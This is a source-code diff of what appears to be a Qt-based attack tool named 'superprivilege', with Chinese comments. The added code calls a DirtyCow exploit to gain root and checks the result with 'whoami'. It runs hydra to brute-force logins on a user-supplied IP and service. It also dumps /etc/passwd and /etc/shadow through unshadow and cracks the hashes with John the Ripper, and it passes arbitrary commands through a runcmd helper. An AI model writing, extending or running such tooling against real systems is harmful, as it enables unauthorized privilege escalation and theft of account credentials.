@@ -1,5 +1,6 @@
 #include "superprivilege.h"
 #include "c37292.h"
+#include "dirtycow/dcow.h"
 
 extern QString getcurrenttime();
 
@@ -376,42 +377,128 @@ void superprivilege::horizontalPrivilege()
 
 int superprivilege::powerAuthority()
 {
-    appendOutputV("纵向提权成功，已经获取root权限.");
-    return 0;
+//    appendOutputV("纵向提权成功，已经获取root权限.");
+//    return 0;
 
     //在目標機上測試執行
-    c37292 *p37292 = new c37292();
+//    c37292 *p37292 = new c37292();
+//    return p37292->attack();
 
-    return p37292->attack();
+//    system("./37292");//OK
+//    system("su -");
+//    appendOutputV(runcmd("su -"));
+
+//    system("./dcow -s");
+//    appendOutputV(runcmd("dcow -s"));
+
+    Dcow dcow(true, true);
+    dcow.expl();
+
+    appendOutputV(runcmd("whoami"));
+
+//   const char  flags[]   = "shn";
+//   int         c;
+//   bool        opShell   = false,
+//               restPwd   = argc != 1 ? true : false;
+
+//   opterr = 0;
+//            opShell = true;
+//         break;
+//         case 'n':
+//            restPwd = false;
+//         break;
+//         case 'h':
+//            printInfo(argv[0]);
+//         break;
+//         default:
+//            cerr << "Invalid parameter." << endl << endl;
+//            printInfo(argv[0]);
+//      }
+//   }
+
+//   if(!restPwd && !opShell && argc != 1){
+//            cerr << "Invalid parameter: -n requires -s" << endl << endl;
+//            printInfo(argv[0]);
+//   }
+
+//   Dcow dcow(opShell, restPwd);
+//   return dcow.expl();
+
+    return 0;
+
+
+
+//    QProcess p(0);
+//    QString cmd = "./37292";
+//    p.start(cmd);
+//    p.waitForStarted();
+//    p.waitForFinished();
+//    QString strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
+//    appendOutputOn(strTemp);
+
+    /*
+    FILE *pf;
+    char buffer[4096];
+    pf = popen("./37292", "r");
+    fread(buffer, sizeof(buffer), 1, pf);
+    printf("%s\n", buffer);
+    appendOutputV(buffer);
+    pclose(pf);
+
+    QProcess *p = new QProcess();
+////    QString cmd = "37292";
+////    QString cmd = "./37292";
+    QString cmd = "test37292";
+//    p->start(cmd);
+//    p->waitForStarted();
+//    p->waitForFinished();
+//    QString strTemp=QString::fromLocal8Bit(p->readAllStandardOutput());
+//    appendOutputV(strTemp);
+
+    cmd = "whoami";
+    p->start(cmd);
+    p->waitForStarted();
+    p->waitForFinished();
+QString    strTemp=QString::fromLocal8Bit(p->readAllStandardOutput());
+    appendOutputV(strTemp);
+
+/**/
 }
 
 void superprivilege::onlineAttack()
 {
+    appendOutputOn(runcmd("rm -rf save.log"));
+    QString command = "hydra -L user.txt -P password.txt -t 6 -vV -e ns -o save.log "+m_ip->text() + " " + m_comboBox->currentText();
+    appendOutputOn(runcmd(command));
+    appendOutputOn(runcmd("cat save.log"));
+
     appendOutputOn("Online attack has been done.\n");
 
-    QProcess p(0);
+//    return;
+
+//    QProcess p(0);
 
 //    QString cmd = "hydra -L user.txt -P password.txt -t 6 -vV -e ns -o save.log 127.0.0.1 ssh";
-    QString cmd = "rm -rf save.log";
-    p.start(cmd);
-    p.waitForStarted();
-    p.waitForFinished();
-    QString strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
-    appendOutputOn(strTemp);
+//    QString cmd = "rm -rf save.log";
+//    p.start(cmd);
+//    p.waitForStarted();
+//    p.waitForFinished();
+//    QString strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
+//    appendOutputOn(strTemp);
 
-    cmd = "hydra -L user.txt -P password.txt -t 6 -vV -e ns -o save.log "+m_ip->text() + " " + m_comboBox->currentText();
-    p.start(cmd);
-    p.waitForStarted();
-    p.waitForFinished();
-    strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
-    appendOutputOn(strTemp);
+//    cmd = "hydra -L user.txt -P password.txt -t 6 -vV -e ns -o save.log "+m_ip->text() + " " + m_comboBox->currentText();
+//    p.start(cmd);
+//    p.waitForStarted();
+//    p.waitForFinished();
+//    strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
+//    appendOutputOn(strTemp);
 
-    cmd = "cat save.log";
-    p.start(cmd);
-    p.waitForStarted();
-    p.waitForFinished();
-    strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
-    appendOutputOn(strTemp);
+//    cmd = "cat save.log";
+//    p.start(cmd);
+//    p.waitForStarted();
+//    p.waitForFinished();
+//    strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
+//    appendOutputOn(strTemp);
 
 }
 
@@ -435,10 +522,10 @@ void superprivilege::offlineAttack()
 //    QString strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
 //    appendOutputOff(strTemp);
 
-    QProcess p(0);
-    QString cmd = "john mypasswd"; //"unshadow /etc/passwd /etc/shadow > mypasswd";
+//    QProcess p(0);
+//    QString cmd = "john mypasswd"; //"unshadow /etc/passwd /etc/shadow > mypasswd";
 
-    QStringList paramsList;
+//    QStringList paramsList;
 //    paramsList.append("/etc/passwd /etc/shadow > mypasswd");
 
 //    paramsList.append("/etc/passwd");
@@ -446,20 +533,20 @@ void superprivilege::offlineAttack()
 //    paramsList.append(">");
 //    paramsList.append("mypasswd111");//etc/shadow > mypasswd
 //    p.start(cmd,paramsList);
-    p.start(cmd);
-    p.waitForStarted();
-    p.waitForFinished();
-    QString strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
-    appendOutputOff(strTemp);
+//    p.start(cmd);
+//    p.waitForStarted();
+//    p.waitForFinished();
+//    QString strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
+//    appendOutputOff(strTemp);
 
 
-    cmd = "john --show mypasswd"; //"unshadow /etc/passwd /etc/shadow > mypasswd";
+//    cmd = "john --show mypasswd"; //"unshadow /etc/passwd /etc/shadow > mypasswd";
 
-    p.start(cmd);
-    p.waitForStarted();
-    p.waitForFinished();
-    strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
-    appendOutputOff(strTemp);
+//    p.start(cmd);
+//    p.waitForStarted();
+//    p.waitForFinished();
+//    strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
+//    appendOutputOff(strTemp);
 
 
     /*
@@ -537,19 +624,49 @@ void superprivilege::offlineAttack()
 
 void superprivilege::offlineAttackPython()
 {
+    appendOutputOff(runcmd("python3 ./attackpassword.py"));
+//    QProcess p(0);
+//    p.start("python3 ./attackpassword.py");
+//    p.waitForStarted();
+//    p.waitForFinished();
+//    QString strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
+//    appendOutputOff(strTemp);
+}
+
+QString superprivilege::runcmd(QString command)
+{
     QProcess p(0);
-    p.start("python3 ./attackpassword.py");
+    p.start(command);
     p.waitForStarted();
     p.waitForFinished();
     QString strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
-    appendOutputOff(strTemp);
+    return strTemp;
 }
 
 void superprivilege::offlineAttackJohn()
 {
+    appendOutputOff(runcmd("rm -rf mypasswd"));
+    appendOutputOff(runcmd("umask 077"));
+    QString strRecv=runcmd("unshadow /etc/passwd /etc/shadow");
+    QFile file("mypasswd");
+    file.open(QIODevice::WriteOnly | QIODevice::Text);
+    file.write(strRecv.toUtf8());
+    file.close();
+
+    appendOutputOff(runcmd("john mypasswd"));
+    appendOutputOff(runcmd("john --show mypasswd"));
+    return;
+
+    /*
     QProcess p(0);
 
-    QString cmd = "unshadow /etc/passwd /etc/shadow"; //"unshadow /etc/passwd /etc/shadow > mypasswd";
+    QString cmd = "umask 077";
+    p.start(cmd);
+    p.waitForStarted();
+    p.waitForFinished();
+    strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
+
+    cmd = "unshadow /etc/passwd /etc/shadow"; //"unshadow /etc/passwd /etc/shadow > mypasswd";
     p.start(cmd);
     p.waitForStarted();
     p.waitForFinished();
@@ -576,5 +693,5 @@ void superprivilege::offlineAttackJohn()
     p.waitForFinished();
     strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
     appendOutputOff(strTemp);
-
+*/
 }
